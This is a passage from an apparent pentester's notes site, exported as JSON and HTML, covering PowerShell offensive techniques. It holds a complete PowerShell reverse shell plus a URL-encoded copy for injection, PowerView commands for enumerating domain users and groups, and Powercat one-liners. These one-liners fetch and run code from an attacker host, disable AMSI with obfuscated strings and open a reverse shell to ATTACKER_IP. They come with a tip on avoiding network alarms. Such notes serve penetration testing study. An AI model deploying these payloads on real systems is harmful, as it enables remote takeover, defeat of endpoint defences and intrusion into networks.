style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;..&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt;65535&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; |&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt; %&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;{&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt;0&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;};&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;while&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; ((&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; $&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;i&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; $&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;stream.Read&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;($&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;bytes&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 0&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; $&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;bytes.Length&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; )&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; -ne&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 0&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; {&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;\t$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;data&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; (&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;New-Object&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;TypeName System.Text.ASCIIEncoding&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;.GetString&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;($&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;bytes&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 0&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; $&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;i&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;);&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;\t$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;sendback&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; (&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; iex &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;data&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; 2&gt;&amp;#x26;1&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; |&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt; Out-String&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; );&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;\t$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;sendback2&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; $&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;sendback&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; +&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;PS &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; +&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; (&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;pwd&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;.Path &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;+&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;&gt; &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;\t$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;sendbyte&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; (&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; [&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;text.encoding&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;]&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;::ASCII &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;.GetBytes&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;($&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;sendback2&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;);&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;\t$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;stream.Write&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;($&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;sendbyte&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 0&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; $&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;sendbyte.Length&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;);&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;\t$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;stream.Flush&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;()&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;client.Close&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;URL-encoded version (uses &lt;code&gt;powershell -c &quot;$CODE&quot;&lt;/code&gt;):&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27&amp;#x3C;IP&gt;%27%2C&amp;#x3C;PORT&gt;%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;Note that &lt;code&gt;&amp;#x3C;IP&gt;&lt;/code&gt; and &lt;code&gt;&amp;#x3C;PORT&gt;&lt;/code&gt; need to be appropriately replaced in the above code.&lt;/p&gt;\n&lt;p&gt;One annoying thing about this reverse shell… There’s no initial prompt, so you have no idea whether you’ve connected or not. but as soon as you enter a command (&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/whoami&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/whoami&quot;&gt;whoami&lt;/a&gt;, etc.), a prompt will appear after the output. On the plus side, however, this reverse shell will persist even after the &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/PHP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/PHP&quot;&gt;PHP&lt;/a&gt; script times out!&lt;/p&gt;"},"spells/PowerView":{"slug":"spells/PowerView","filePath":"spells/PowerView.md","title":"PowerView","links":[],"tags":["Application/PowerShell/PowerView","AttackCycle/Reconnaissance","OS/Windows/AMSI"],"content":"PowerView is a PowerShell reconnaissance tool. Note that AMSI will need to be disabled in the current session before it can be used.\nDomain enumeration\n# Get domain users and associated groups\n#\nGet-DomainUsers | select name, memberof\n \n# Get all service accounts in a domain\n#\nGet-DomainUsers -SPN\n \n# Get all domain group members, including nested domain groups\n#\nGet-DomainGroupMember -Identity $GROUP_NAME\n \n# Show all users that previously logged on to a machine\n# (defaults to local machine; requires admin privileges to be\n# run against remote machines)\n#\nGet-NetLoggedon | select UserName\n \n# Show all users who are logged in to a machine RIGHT NOW\n# (does not require admin privileges for remote systems if run\n# from Windows Server)\n#\nGet-NetSession","richContent":"&lt;p&gt;&lt;a href=&quot;https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;PowerView&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; is a PowerShell reconnaissance tool. Note that AMSI will need to be disabled in the current session before it can be used.&lt;/p&gt;\n&lt;h2 id=&quot;domain-enumeration&quot;&gt;Domain enumeration&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#domain-enumeration&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Get domain users and associated groups&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;Get-DomainUsers&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; |&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; select name&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; memberof&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Get all service accounts in a domain&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;Get-DomainUsers&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;SPN&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Get all domain group members, including nested domain groups&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;Get-DomainGroupMember&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;Identity &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;GROUP_NAME&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Show all users that previously logged on to a machine&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# (defaults to local machine; requires admin privileges to be&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# run against remote machines)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;Get-NetLoggedon&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; |&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; select UserName&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Show all users who are logged in to a machine RIGHT NOW&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# (does not require admin privileges for remote systems if run&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# from Windows Server)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;Get-NetSession&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"},"spells/Powercat":{"slug":"spells/Powercat","filePath":"spells/Powercat.md","title":"Powercat","links":["spells/netcat","spells/Disable-AMSI"],"tags":["Application/PowerShell/Powercat","AttackCycle/LateralMovement","Application/netcat","OS/Linux/Distros/Kali","OS/Windows/AMSI"],"content":"Powercat is a PowerShell-native re-implementation of netcat. Powercat can be installed on Kali Linux using sudo apt install powercat; the script can be found at /usr/share/windows-resources/powercat/powercat.ps1.\nTo execute:\npowershell -c &quot;IEX(New-Object System.Net.WebClient).DownloadString(&#039;http://$ATTACKER_IP:$ATTACKER_DOWNLOAD_PORT/powercat.ps1&#039;);powercat -c $ATTACKER_IP -p $ATTACKER_PORT -e cmd&quot;\nOne line reverse shell\nThis disables AMSI, downloads Powercat into memory, invokes the module, and fires up a reverse shell.\n[REF].Assembly.GetType(&#039;System.Management.Automation.&#039;+$(&quot;41 6D 73 69 55 74 69 6C 73&quot;.Split(&quot; &quot;)|forEach{[char]([convert]::toint16($_,16))}|forEach{$result=$result+$_};$result)).GetField($(&quot;61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64&quot;.Split(&quot; &quot;)|forEach{[char]([convert]::toint16($_,16))}|forEach{$result2=$result2+$_};$result2),&#039;NonPublic,Static&#039;).SetValue($null,$true); IEX (New-Object System.Net.Webclient).DownloadString(&quot;raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&quot;); powercat -c $ATTACKER_IP -p $ATTACKER_PORT -e cmd.exe\nIt’s probably advisable to use your own server to host Powercat in order to make tripping network alarms less likely.","richContent":"&lt;p&gt;&lt;a href=&quot;https://github.com/besimorhino/powercat&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Powercat&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; is a PowerShell-native re-implementation of &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/netcat&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/netcat&quot;&gt;netcat&lt;/a&gt;. Powercat can be installed on Kali Linux using &lt;code&gt;sudo apt install powercat&lt;/code&gt;; the script can be found at /usr/share/windows-resources/powercat/powercat.ps1.&lt;/p&gt;\n&lt;p&gt;To execute:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;powershell &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;c &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;IEX(New-Object System.Net.WebClient).DownloadString(&#039;http://&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;ATTACKER_IP:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;ATTACKER_DOWNLOAD_PORT/powercat.ps1&#039;);powercat -c &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;ATTACKER_IP -p &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;ATTACKER_PORT -e cmd&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;h2 id=&quot;one-line-reverse-shell&quot;&gt;One line reverse shell&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#one-line-reverse-shell&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;This &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Disable-AMSI&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Disable-AMSI&quot;&gt;disables AMSI&lt;/a&gt;, downloads Powercat into memory, invokes the module, and fires up a reverse shell.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;REF&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;]&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;.Assembly.GetType&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;System.Management.Automation.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;span 